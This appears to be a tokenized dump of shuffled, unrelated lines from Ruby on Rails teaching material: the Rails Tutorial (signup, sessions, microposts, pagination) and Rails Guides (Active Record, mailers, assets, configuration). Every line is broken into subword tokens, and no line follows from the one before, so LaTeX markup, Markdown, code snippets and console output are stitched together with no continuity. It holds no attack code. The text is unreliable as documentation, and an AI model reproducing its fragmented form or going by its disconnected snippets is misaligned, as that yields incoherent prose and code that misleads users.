▁The ▁\ k ode { rake ▁db : migrate } ▁command ▁is ▁ probably ▁the ▁most ▁common , ▁but ▁there ▁are ▁many ▁other s ; ▁you ▁can ▁see ▁a ▁list ▁of ▁database ▁task s ▁using ▁\ k ode { - T ▁db } :
▁The ▁ paginate d ▁users ▁index ▁is ▁now ▁complete , ▁but ▁there ' s ▁one ▁improve ment ▁I ▁can ' t ▁re s ist ▁including : ▁Rails ▁has ▁some ▁in c r ed i b ly ▁ s li c k ▁tool s ▁for ▁making ▁ compact ▁views , ▁and ▁in ▁this ▁section ▁we ' ll ▁refactor ▁the ▁index ▁page ▁to ▁use ▁them .
▁Because ▁of ▁the ▁\ k ode { navbar - fixed - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁R at her ▁than ▁changing ▁Rake file , ▁you ▁should ▁add ▁your ▁own ▁task s ▁by ▁adding ▁files ▁to ▁the ▁ lib / t as k s ▁directory ▁of ▁your ▁application .
▁x ▁= ▁x ▁+ ▁1
▁ Compar ing ▁Listing ~\ ref { code : signup _ form } ▁with ▁Listing ~\ ref { code : signup _ form _ html }, ▁we ▁see ▁that ▁the ▁ embedded ▁Ruby
▁A ▁user ▁profile ▁with ▁an ▁ unfollow ▁button ▁(\ href { http ://0▖0▖0▖0:3000/ users /5}{/ users /5}) .
▁You ▁may ▁recall ▁the ▁console ▁example ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols }, ▁where ▁we ▁saw ▁how ▁to ▁iterate ▁through ▁a ▁hash ▁using ▁the ▁ str ate g ical ly ▁named ▁\ k ode { flash } ▁variable :
▁Similar ly , ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁we ' ll ▁generate ▁a ▁\ emph { model } ▁as ▁follows :
▁With ▁invalid ▁information , ▁the ▁update ▁attempt ▁returns ▁\ k ode { false }, ▁so ▁the ▁\ k ode { else } ▁branch ▁re - render s ▁the ▁edit ▁page .
▁For ▁example ,
▁is ▁an ▁\ emph { assignment }, ▁which ▁we ▁must ▁define .
▁For ▁example , ▁the ▁command ▁I ▁ r an ▁was
▁If ▁we ▁instead ▁ authenticate ▁with ▁the ▁correct ▁password , ▁\ k ode { authenticate } ▁returns ▁the ▁user ▁itself :
▁* ▁` config ▖ force _ ssl ` ▁ force s ▁all ▁requests ▁to ▁be ▁under ▁HTTP S ▁protocol ▁by ▁using ▁` ActionDispatch :: SSL ` ▁middleware .
▁( Listing ~\ ref { code : full _ title _ helper _ tests } ▁uses ▁\ k ode { assert \_ equal ▁< expect ed > , ▁< actual > }, ▁which ▁verifie s ▁that ▁the ▁expected ▁result ▁\ line break ▁matches ▁the ▁actual ▁value ▁when ▁compar ed ▁with ▁the ▁\ k ode {==} ▁operator ▖)
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁As ▁Sprockets ▁uses ▁[ Tilt ]( https :// github ▖ com / r to ma y k o / til t ) ▁as ▁a ▁generic ╼ interface ▁to ▁different ▁te m plat ing ▁engines , ▁your ▁gem ▁should ▁just ▁implement ▁the ╼ Tilt ▁template ▁protocol ▖
▁( D e f in ing ▁methods ▁in ▁the ▁console ▁is ▁a ▁bit ▁cumbersome , ▁and ▁or dinarily ▁you ▁would ▁use ▁a ▁file , ▁but ▁it ' s ▁convenient ▁for ▁ demo n str ation ▁purposes ▖)
▁We ' ll ▁add ▁some ▁( ve ry ▁slightly ) ▁dynamic ▁content ▁starting ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages }, ▁but ▁as ▁they ▁stand ▁the ▁views ▁in ▁Listing ~\ ref { code : raw _ home _ view } ▁and ▁Listing ~\ ref { code : raw _ help _ view } ▁ underscore ▁an ▁important ▁point : ▁Rails ▁views ▁can ▁simply ▁contain ▁static ▁HTML ▖ ▁This ▁means ▁we ▁can ▁ begin ▁custom i z ing ▁the ▁Home ▁and ▁Help ▁pages ▁even ▁with ▁no ▁ knowledg e ▁of ▁Rails , ▁as ▁show n ▁in ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page } .
▁When ▁included ▁in ▁a ▁model ▁as ▁above , ▁this ▁one ▁method ▁add s ▁the ▁following ▁functionality :
▁customer ▖ orders ( true )▖ empty ?
▁#### ▁In ter n al ▁Attributes
▁users ▖ each ▁ { ▁| user | ▁Noti fi er ▖ notify ( user , ▁ ▖▖▖)
▁ umerate }╼╼ ▁% ▁subsection ▁ requiring _ logged _ in _ users ▁( end )╼╼ ▁\ subsection { Requir ing ▁the ▁right ▁user } ▁% ▁( fold )╼ ▁\ label { sec : requiring _ the _ right _ user }╼╼
▁Defaults ▁to ▁` ' signed ▁ encrypted ▁cookie ' ` .
▁The ▁StaticPages ▁controller ▁ spec ▁with ▁title ▁tests .
▁ Comm it
▁Let ' s ▁get ▁started ▁by ▁review ing ▁the ▁code ▁for ▁the ▁signup ▁form :
▁bundle ▁exec ▁rake ▁ rdoc
▁* ▁` config ▖ action _ mailer ▖ perform _ deliveries ` ▁specifie s ▁whether ▁mail ▁will ▁actually ▁be ▁ deliver ed ▁and ▁is ▁true ▁by ▁default ▖
▁Using ▁ / Users / mhartl / ▖ rvm / gem s / ruby - 2▖0▖ 0 - p 0 ▁with ▁gem set ▁ railstutorial _ rails _4_0
▁" hello "▖ at (10) ▁# ▁=> ▁nil
▁ Hash ▁values ▁can ▁be ▁virtual ly ▁anything , ▁even ▁other ▁hashes , ▁as ▁seen ▁in ▁Listing ~\ ref { code : nested _ hashes } .
▁* ▁` headers ` ▁- ▁Specif ies ▁any ▁header ▁on ▁the ▁email ▁you ▁want ▖
▁invoke ▁ rspec
▁The ▁\ k ode { generate } ▁command ▁produce s ▁a ▁migration ▁to ▁create ▁a ▁\ k ode { microposts } ▁table ▁in ▁the ▁database ▁( Listing ~\ ref { code : micropost _ migration }) ; ▁compare ▁it ▁to ▁the ▁analogous ▁migration ▁for ▁the ▁\ k ode { users } ▁table ▁from ▁Listing ~\ ref { code : users _ migration } .
▁#### # ▁` where `
▁sign - up
▁A mong ▁other ▁things , ▁adding ▁this ▁feature ▁requires ▁learning ▁how ▁to ▁send ▁mail ▁with ▁Rails .
▁For ▁example , ▁given
▁g ig abytes
▁P re tt y ▁under w h el m ing , ▁you ▁say ?
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁green ▁after ▁changing ▁the ▁application ▁code :
▁In ▁particular , ▁in ▁the ▁ Activations ▁controller ▁\ k ode { edit } ▁action , ▁the ▁token ▁will ▁be ▁available ▁in ▁the ▁\ k ode { params } ▁hash ▁as ▁\ k ode { params [: id ]} .
▁Ruby ▁has ▁built - in ▁support ▁for ▁tak ing ▁ s li ce s ▁out ▁of ▁strings ▁and ▁arrays ▖
▁The ▁\ k ode { will \_ paginate } ▁method ▁is ▁a ▁little ▁magic al ; ▁inside ▁a ▁\ k ode { users } ▁view , ▁it ▁automatically ▁look s ▁for ▁an ▁\ k ode {@ users } ▁object , ▁and ▁then ▁display s ▁pagination ▁links ▁to ▁access ▁other ▁pages .
▁By ▁is s u ing ▁a ▁\ text tt { PATCH } ▁request ▁directly ▁to ▁the ▁\ k ode { update } ▁method ▁as ▁show n ▁in ▁Listing ~\ ref { code : for b id d en _ admin _ test }, ▁verify ▁that ▁the ▁\ k ode { admin } ▁attribute ▁isn ' t ▁edit able ▁through ▁the ▁web .
▁Tests ▁for ▁the ▁Micropost ▁model ▁validations ▖
▁With ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ) .
▁It ' s ▁also ▁worth ▁noting ▁that ▁we ▁could ▁actually ▁omit ▁the ▁\ k ode { : source } ▁key ▁in ▁this ▁case , ▁using ▁simply
▁Note ▁that ▁not h ing ▁in ▁the ▁above ▁code ▁uses ▁the ▁current ▁user , ▁so ▁the ▁same ▁links ▁work ▁for ▁other ▁users , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : different _ user _ followers } .
▁We ▁can ▁see ▁how ▁this ▁works ▁using ▁the ▁console :
▁Instead , ▁setting ▁` config ▖ assets ▖ css _ compressor ` ▁and ╼` config ▖ assets ▖ js _ compressor ` ▁will ▁control ▁compression ▁of ▁CSS ▁and ▁JavaScript ╼ assets .
▁* ▁` config ▖ assets ▖ cache _ store ` ▁defines ▁the ▁cache ▁store ▁that ▁Sprockets ▁will ▁use ▖
▁render ▁" index "
▁author s ▁= ▁Author ▖ where ( name : ▁' H an k ▁M ood y ')▖ to _ a
▁E x a m in ing ▁Listing ~\ ref { code : toy _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁The ▁method ▁also ▁accept s ▁options ▁like ▁`: dasherize ` ▁and ▁f ri end s , ▁they ▁are ▁forward ed ▁to ▁the ▁ builder :
▁As ▁a ▁first ▁application ▁of ▁the ▁ MVC ▁framework , ▁we ' ll ▁make ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M r _ C re o so te } { w a f er - th in } ▁change ▁to ▁the ▁first ▁app ▁by ▁adding ▁a ▁\ emph { controller ▁action } ▁to ▁render ▁the ▁string ▁`` hello , ▁world !'' .
▁def ▁process _ with _ stringified _ params (▖▖▖)
▁* ▁In ▁Rails ▁4▖0 , ▁` ActionController :: U n k now n Form at ` ▁is ▁raised ▁when ▁the ▁action ▁doesn ' t ▁handle ▁the ▁request ▁format ▖
▁To ▁pre serv e ▁the ▁current ▁default , ▁add ▁the ▁following ╼ line ▁to ▁your ▁` production ▖ rb `:
▁# ▁ Make ▁sure ▁your ▁secret _ key _ base ▁is ▁ k e p t ▁ private
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / regex p ▖ rb ` .
▁( In ▁the ▁full ▁third ▁ edition ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁I ▁plan ▁to ▁eliminate ▁this ▁requirement ▁by ▁a do p ting ▁the ▁new er ▁technique ▁of ▁\ href { https :// www ▖ re li sh app ▖ com / rspec / rspec - rails / docs / feature - spec s / feature - spec } { feature ▁ spec s } ▖)
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : persistent _ current _ user }, ▁new ly ▁logged ▁in ▁users ▁are ▁correctly ▁remember ed , ▁as ▁you ▁can ▁verify ▁by ▁logging ▁in , ▁ closing ▁the ▁browser , ▁and ▁check ing ▁that ▁you ' re ▁ still ▁logged ▁in ▁when ▁you ▁restart ▁the ▁sample ▁application ▁and ▁re visit ▁the ▁sample ▁application .
▁We ▁next ▁install ▁the ▁gems ▁by ▁running ▁\ k ode { bundle ▁install } :
▁ kilobyte s
▁$ ▁git ▁ checkout ▁4 - 0 - s table
▁To ▁fix ▁the ▁problem , ▁just ▁hit ▁return ▁again ▖)
▁config ▖ middleware ▖ insert _ before ( Rack :: Lock , ▁ ActionDispatch :: B est S t and ar d s S up port )
▁The ▁result ing ▁\ k ode { user ▖ forget } ▁method ▁just ▁undo es ▁\ k ode { user ▖ remember } ▁by ▁updating ▁the ▁remember ▁digest ▁with ▁\ k ode { nil }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ forget } .
▁The ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁combination ▁gives ▁ ri se ▁to ▁methods ▁that ▁work ▁through ▁the ▁association .
▁@ number ▖ try (: next )
▁as ▁seen ▁in ▁Listing ~\ ref { code : new _ action _ with _ user } .
▁def ▁name
▁╼╼ ▁\ subsection { Array s ▁and ▁ range s } ▁% ▁( fold )╼ ▁\ label { sec : array s _ and _ range s }╼╼
▁Having ▁ finished ▁the ▁foundation ▁of ▁the ▁sample ▁application ' s ▁authentication ▁system , ▁we ' re ▁going ▁to ▁take ▁this ▁opportunit y ▁to ▁show ▁how ▁to ▁write ▁signin ▁tests ▁using ▁\ href { http :// c u k es ▖ info } { Cucumber }, ▁a ▁popular ▁tool ▁for ▁behavior - driven ▁development ▁that ▁ en j o y s ▁significant ▁popular ity ▁in ▁the ▁Ruby ▁ community .
▁If ▁you ▁are ▁un sure ▁of ▁the ▁documentation ▁changes , ▁you ▁can ▁create ▁an ▁issue ▁in ▁the ▁[ Rails ]( https :// github ▖ com / rails / rails / issue s ) ▁issues ▁ track er ▁on ▁GitHub .
▁For ▁example , ▁let ' s ▁say ▁your ▁asset ▁host ▁is ▁` assets ▖ example ▖ com `:
▁Note ▁that ▁we ▁don ' t ▁need ▁to ▁add ▁a ▁view ▁for ▁this ╼ action ▁since ▁we ' re ▁redirect ing ▁to ▁the ▁` index ` ▁action .
▁invoke ▁assets
▁instead ▁of
▁<% ▁sample ▖ in _ groups _ of (3) ▁do ▁| a , ▁b , ▁c | ▁%>
▁L at er ▁in ▁this ▁guide ▁you ' ll ▁find ▁ detailed ▁instructions ▁for ▁pro po s ing ▁a ▁ patch ▁to ╼ Ruby ▁on ▁Rails ▖
▁class _ name : ▁" M y Application :: B us in ess :: Supplier "
▁* ▁` photo _ path (: id ) ` ▁returns ▁` / photos / : id ` ▁( for ▁instance , ▁` photo _ path (10) ` ▁returns ▁` / photos / 10 ` )
▁Rails ▁3▖2 ▁ de pre cat es ▁` vendor / plugin s ` ▁and ▁Rails ▁4▖0 ▁will ▁remove ▁them ▁completely ▖
▁This ▁method ▁is ▁an ▁alias ▁of ▁` Array # << ` .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate }, ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁is ▁now ▁available ▁in ▁the ▁Microposts ▁controller , ▁which ▁means ▁that ▁we ▁can ▁add ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁and ▁then ▁restrict ▁access ▁to ▁them ▁using ▁a ▁before ▁filter , ▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ controller _ access _ control } .
▁def ▁perform ( trashable _ class , ▁ trashable _ id , ▁ de p th )
▁Client ▖ sum (" orders _ count ")
▁The ▁rest ▁of ▁this ▁guide ╼ will ▁show ▁you ▁how ▁Rails ▁can ▁help ▁you ▁write ▁website s ▁in ▁this ▁way , ▁but ▁it ' s ╼ all ▁built ▁on ▁to p ▁of ▁this ▁fai r ly ▁simple ▁technique .
▁error
▁If ▁" SSL " ▁was ▁defined ▁to ▁be ▁an ▁ acronym :
▁If ▁this ▁asset ▁isn ' t ▁namespaced , ▁there ▁is ▁a ╼ po s s i b i l ity ▁that ▁the ▁host ▁application ▁could ▁have ▁an ▁asset ▁named ▁identical ly , ▁in ╼ which ▁case ▁the ▁application ' s ▁asset ▁would ▁take ▁precedence ▁and ▁the ▁engine ' s ▁one ╼ w o ul d ▁be ▁ignore d .
▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ .
▁# ▁Your ▁secret ▁key ▁is ▁used ▁for ▁verify ing ▁the ▁in te gr ity ▁of ▁signed ▁cookies .
▁Client ▖ order (" orders _ count ▁ASC , ▁created _ at ▁DESC ")
▁Use ful ▁when ▁CDN s ▁are ▁used ▁for ▁host ing ▁assets ▁rather ▁than ▁the ▁application ▁server ▁itself .
▁Mailer s ▁are ▁very ▁similar ▁to ▁Rails ▁controllers ▖
▁By ▁default , ▁methods ▁defined ▁in ▁any ▁helper ▁file ▁are ▁automatically ▁available ▁in ▁any ▁view , ▁but ▁for ▁convenience ▁we ' ll ▁put ▁the ▁\ k ode { gravatar \_ for } ▁method ▁in ▁the ▁file ▁for ▁helpers ▁ associated ▁with ▁the ▁Users ▁controller .
▁In ▁addition , ▁many ▁readers ▁have ▁report ed ▁benefit ing ▁from ▁going ▁through ▁it ▁a ▁second ▁time .
▁ W hether ▁a ▁changing ▁title ▁represent s ▁\ emph { t ru ly } ▁dynamic ▁content ▁is ▁ de b a table , ▁but ▁in ▁any ▁case ▁it ▁ la y s ▁the ▁necessary ▁foundation ▁for ▁un a mb ig u ous ly ▁dynamic ▁content ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁* ▁ Update ▁the ▁( s ur r ound ing ) ▁documentation , ▁examples ▁else where , ▁and ▁the ▁ guides : ▁what ever ▁is ▁a ffect ed ▁by ▁your ▁con t ri but ion .
▁Method ▁ V is i b i l ity
▁# ▁ Make ▁sure ▁the ▁secret ▁is ▁at ▁least ▁30 ▁characters ▁and ▁all ▁random ,
▁( Compar e ▁to ▁the ▁integration ▁test ▁for ▁`` delete '' ▁links ▁in ▁Listing ~\ ref { code : delete _ link _ integration _ test } ▖)
▁We ▁see ▁from ▁Table ~\ ref { table : user _ and _ and } ▁that ▁the ▁\ k ode { if } ▁statement ▁is ▁\ k ode { true } ▁only ▁if ▁a ▁user ▁with ▁the ▁given ▁email ▁both ▁exists ▁in ▁the ▁database ▁and ▁has ▁the ▁given ▁password , ▁exactly ▁as ▁required .
▁WARNING : ▁S ince ▁in ▁this ▁case ▁the ▁name ▁of ▁the ▁generated ▁method ▁is ▁ com po s ed ▁of ▁the ▁ target ▁object ▁and ▁ target ▁method ▁names , ▁the ▁`: to ` ▁option ▁must ▁be ▁a ▁method ▁name .
▁| ` default _ options ` | Allow s ▁you ▁to ▁set ▁default ▁values ▁for ▁the ▁` mail ` ▁method ▁options ▁( `: from `, ▁`: reply _ to `, ▁etc ▖) .
▁ Migration s ▁are ▁store d ▁in ▁files ▁which ▁are ▁executed ▁again st ▁any ╼ database ▁that ▁Active ▁Record ▁supports ▁using ▁` rake ` ▖
▁* ▁`: dependent `
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ stringify _ keys
▁ ActiveSupport ▖ on _ load (: action _ controller ) ▁do
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁If ▁you ▁have ▁a ▁field ▁called ▁` first _ name ` ▁on ▁your ▁` Client ` ▁model ▁for ▁example , ▁you ▁get ▁` find _ by _ first _ name ` ▁for ▁free ▁from ▁Active ▁Record ▖
▁in ▁Listing ~\ ref { code : token _ method } .
▁#### ▁` all _ day `, ▁` all _ week `, ▁` all _ month `, ▁` all _ quarter ` ▁and ▁` all _ year `
▁The ▁sample ▁application ▁site ▁layout ▖
▁The ▁generated ▁User ▁mailer ▁ preview s .
▁ Show ing ▁a ▁different ▁user ' s ▁followers .
▁ Remember ing ▁users ▁involve s ▁creating ▁a ▁remember ▁token ▁and ▁saving ▁the ▁digest ▁of ▁the ▁token ▁to ▁the ▁database .
▁$ (' # logo ')▖ attr ( { ▁src : ▁" <%= ▁asset _ path (' logo ▖ png ') ▁%> " ▁ }) ;
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁A ▁micropost ▁\ k ode { belongs \_ to } ▁a ▁user ▖
▁To ▁get ▁pagination ▁working , ▁we ▁need ▁to ▁add ▁some ▁code ▁to ▁the ▁index ▁view ▁tell ing ▁Rails ▁to ▁ paginate ▁the ▁users , ▁and ▁we ▁need ▁to ▁replace ▁\ k ode { User ▖ all } ▁in ▁the ▁\ k ode { index } ▁action ▁with ▁an ▁object ▁that ▁know s ▁about ▁pagination .
▁For ▁example , ▁we ▁can ▁use ▁strings ▁as ▁keys :
▁The ▁login ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page .
▁in ▁Listing ~\ ref { code : user _ logout _ test } .
▁╼╼ If ▁you ' ve ▁found ▁a ▁problem ▁in ▁Ruby ▁on ▁Rails ▁which ▁is ▁not ▁a ▁security ▁risk , ▁do ▁a ▁search ▁in ▁GitHub ▁under ▁[ Issue s ]( https :// github ▖ com / rails / rails / issue s ) ▁in ▁case ▁it ▁has ▁already ▁been ▁report ed ▖ ▁If ▁you ▁do ▁not ▁find ▁any ▁issue ▁address ing ▁it ▁you ▁may ▁proceed ▁to ▁[ open ▁a ▁new ▁one ]( https :// github ▖ com / rails / rails / issue s / new )▖
▁U pgrading ▁from ▁Rails ▁4▖0 ▁to ▁Rails ▁4▖1
▁The ▁application ▁mailer ▁with ▁a ▁new ▁default ▁\ k ode { from } ▁address .
▁` beginning _ of _ week ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ week ` ▁and ▁` end _ of _ week ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ week ` .
▁This ▁line ▁m o un t s ▁the ▁engine ▁at ▁the ▁path ▁` / blorgh `, ▁which ▁will ▁make ▁it ▁ accessible ╼ through ▁the ▁application ▁only ▁at ▁that ▁path .
▁We ▁can ▁add ▁it ▁to ▁our ▁app ▁as ▁follows :
▁Validat ing ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▖
▁Do ▁it ▁from ▁start ▁to ▁finish , ▁without ▁jump ing ▁around , ▁and ▁you ' ll ▁get ▁the ▁ ultimate ▁benefit .
▁TIP : ▁If ▁you ' re ▁running ▁Rails ▁on ▁M ic r o s of t ▁Windows , ▁you ▁should ▁use ▁the ▁`: file ` ▁option ▁to ╼ render ▁a ▁file , ▁because ▁Windows ▁filename s ▁do ▁not ▁have ▁the ▁same ▁format ▁as ▁Unix ▁filename s .
▁However , ▁this ▁only ▁seem s ▁to ▁work ▁with ▁ K eep - A li ve ▁connection s ▁( and ▁many ▁browsers ▁are ▁using ▁one - time ▁connection s )▖
▁There , ▁our ▁select ▁was ▁very ▁simple ; ▁we ▁just ▁ pick ed ▁out ▁all ▁the ▁microposts ▁with ▁user ▁id ▁corresponding ▁to ▁the ▁current ▁user :
▁#### ▁time _ zone _ options _ for _ select
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ s li ce (: b , ▁: X )
▁ ╼ # ╼ # ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor ╼ # ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁ global ▁ignore ▁instead : ╼ # ▁git ▁config ▁-- global ▁ core ▖ exclude s file ▁' ~ / ▖ gitignore _ global ' ╼╼ # ▁I gnore ▁ bundler ▁config .
▁will ▁now ▁trigger ▁CSRF ▁ protection ▖
▁The ▁\ k ode { store \_ location } ▁method ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁ puts ▁the ▁request ed ▁URL ▁in ▁the ▁\ k ode { session } ▁variable ▁under ▁the ▁key ▁\ k ode { : forwarding \_ url }, ▁but ▁only ▁for ▁a ▁\ k ode { GET } ▁request .
▁In ▁fact , ▁\ k ode { sudo } ▁is ▁a ▁ concat en ation ▁of ▁the ▁\ k ode { s u } ▁command ▁and ▁the ▁English ▁word ▁`` do '' , ▁and ▁\ k ode { s u } ▁stand s ▁for ▁`` s ub st it ute ▁user '' , ▁as ▁you ▁can ▁verify ▁by ▁typing ▁\ k ode { man ▁ s u } ▁in ▁your ▁ s hell .
▁The ▁last ▁item ▁will ▁ w in .
▁create ▁app / assets / javascripts / blorgh / articles ▖ js
▁right ▁password
▁The ▁rest ▁of ▁the ▁book ▁is ▁d ed icated ▁to ▁f le sh ing ▁out ▁the ▁sample ▁application : ▁first , ▁by ▁adding ▁users ▁who ▁can ▁sign ▁up , ▁log ▁in , ▁and ▁log ▁out ; ▁next , ▁by ▁adding ▁user ▁microposts ; ▁and , ▁finally , ▁by ▁adding ▁the ▁ability ▁to ▁follow ▁other ▁users .
▁* ▁The ▁` development ` ▁environment ▁is ▁used ▁on ▁your ▁development / local ▁computer ▁as ▁you ▁interact ▁manually ▁with ▁the ▁application .
▁helper ▁module _ path
▁X - Cache - H it s :
▁ Category ▖ joins ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tags ])
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁LIMIT ▁20
▁The ▁Micropost ▁model ▁validations ▖
▁resources ▁: photos
▁if ▁email ▖ has _ attachments ?
▁This ▁can ▁be ▁accomplish ed ▁with ▁\ k ode { rails ▁generate ▁ rspec : install } :
▁One ▁thing ▁we ▁notice ▁is ▁that ▁all ▁three ▁examples ▁include ▁a ▁visit ▁to ▁the ▁root ▁path .
▁This ▁pattern ▁of ▁setting ▁a ▁cookie ▁that ▁ expire s ▁20 ▁ years ▁in ▁the ▁future ▁is ▁so ▁common ▁that ▁Rails ▁has ▁a ▁special ▁\ k ode { permanent } ▁method ▁to ▁implement ▁it , ▁so ▁that ▁we ▁can ▁simply ▁write
▁The ▁JavaScript ▁ Embedded ▁Ruby ▁to ▁create ▁a ▁following ▁relationship .
▁A nother ▁common ▁Ruby ▁pattern ▁is ▁assign ing ▁to ▁a ▁variable ▁if ▁it ' s ▁\ text tt { nil } ▁but ▁otherwise ▁leav ing ▁it ▁ al one .
▁| ▁| ▁4 14 ▁| ▁: request _ ur i _ to o _ long ▁|
▁[] ▖ sum (1) ▁# ▁=> ▁1
▁* ▁`: address ` ▁- ▁ Allow s ▁you ▁to ▁use ▁a ▁remote ▁mail ▁server ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang } .
▁| ▁------- --------------- ▁| ▁ --- ---------------- ---------------- ▁|
▁It ▁is ▁an ╼ implementation ▁of ▁the ▁Active ▁Record ▁pattern ▁which ▁itself ▁is ▁a ▁ description ▁of ▁an ╼ Object ▁ Relation al ▁M app ing ▁system .
▁create ▁app / views / users / new ▖ html ▖ erb
▁You ▁can ▁see ▁what ▁the ▁engine ▁has ▁so ▁far ▁by ▁running ▁` rake ▁db : migrate ` ▁at ▁the ▁root ╼ of ▁our ▁engine ▁to ▁run ▁the ▁migration ▁generated ▁by ▁the ▁scaffold ▁generator , ▁and ▁then ╼ running ▁` rails ▁server ` ▁in ▁` test / dummy ` ▖
▁<%= ▁link _ to ▁' New ▁article ', ▁new _ article _ path ▁%>
▁== ▁Create Microposts : ▁migrat ing ▁= ============== ================ ================
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) .
▁ Mo d if y ing ▁built - in ▁classes ▁is ▁a ▁powerful ▁technique , ▁but ▁with ▁great ▁power ▁comes ▁great ▁responsib i l ity , ▁and ▁it ' s ▁consider ed ▁ bad ▁form ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁without ▁ having ▁a ▁\ emph { re ally } ▁good ▁reason ▁for ▁doing ▁so .
▁#### ▁ Partial ▁Layouts
▁articles ▁GET ▁ / articles (▖ : format ) ▁articles # index
▁mail ( subject : ▁" New ▁User ▁Signup : ▁# {@ user ▖ email } ")
▁Defaults ▁to ▁true .
▁=> ▁ { : success =>" It ▁work ed !" , ▁: error =>" It ▁failed ▖ "}
▁Ruby ▁console ▁for ▁your app ▖ heroku app ▖ com
▁Because ▁` Rails :: Application ` ▁inherit s ▁from ▁` Rails :: Railtie ` ▁( in d ir ec t ly ), ▁you ▁can ▁use ▁the ▁` initializer ` ▁method ▁in ▁` config / application ▖ rb ` ▁to ▁define ▁ initializers ▁for ▁the ▁application .
▁stylesheet _ path ▁" application " ▁# ▁=> ▁ / assets / application ▖ css
▁At ▁the ▁end ▁of ▁this ▁tutorial , ▁no ▁matter ▁where ▁you ▁started , ▁you ▁should ▁be ▁ready ▁for ▁the ▁many ▁more ▁inter media te - to - advance d ▁Rails ▁resources ▁out ▁there .
▁Now ▁it ' s ▁time ▁to ▁use ╼ it ▁within ▁an ▁application .
▁# ▁def ▁self ▖ find _ by _ login _ and _ activated (* args )
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE ▁as ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment }, ▁note ▁that ▁this ▁second ▁app ▁can ▁be ▁created ▁in ▁the ▁same ▁ workspace ▁as ▁the ▁first .
▁It ' s ▁common ▁that ▁you ▁need ▁to ▁find ▁a ▁record ▁or ▁create ▁it ▁if ▁it ▁doesn ' t ▁exist ▖
▁If ▁it ▁does , ▁a ▁ warning ▁is ▁issue d ▁if ▁they ▁are ▁enabled ▖
▁Similar ly , ▁the ▁code
▁In ▁the ▁\ emph { Rails ▁Tutorial } ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁ curl y ▁braces ▁only ▁for ▁short ▁one - line ▁blocks ▁and ▁the ▁\ k ode { do ▖ ▖ end } ▁syntax ▁for ▁longer ▁one - line rs ▁and ▁for ▁ multi - line ▁blocks :
▁ Cl ic k ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : ╼ </ p >╼╼< a ▁ href =" http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁You ▁can ▁then ▁get ▁Ruby ▁set ▁up ▁by ▁examining ▁the ▁requirements ▁for ▁ installing ▁it :
